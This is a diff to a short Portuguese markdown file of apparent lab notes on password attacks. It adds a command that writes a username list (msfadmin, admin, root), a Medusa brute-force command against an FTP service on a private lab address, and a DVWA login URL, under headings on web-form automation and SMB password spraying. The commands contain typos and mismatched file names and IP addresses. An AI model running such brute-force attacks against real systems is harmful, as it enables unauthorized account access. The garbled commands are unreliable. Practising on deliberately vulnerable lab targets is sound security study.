@@ -15,8 +15,17 @@
 
 - users.txt
 - passwords.txt
+  
+```
+echo
+echo-e 'user\nmsfadmin\admin\nroot' > users.txt 
+```
+``` medusa -h 192.16.56.102 -U usaer.txt -P pass.txt -M ftp -t 6 ```
+
 
 ## Automação de tentativas em formulário web (DVWA) 
+
+https://192.168.56.10/dvwa/login.php
 
 ## Password spraying em SMB com enumeração de usuários
  
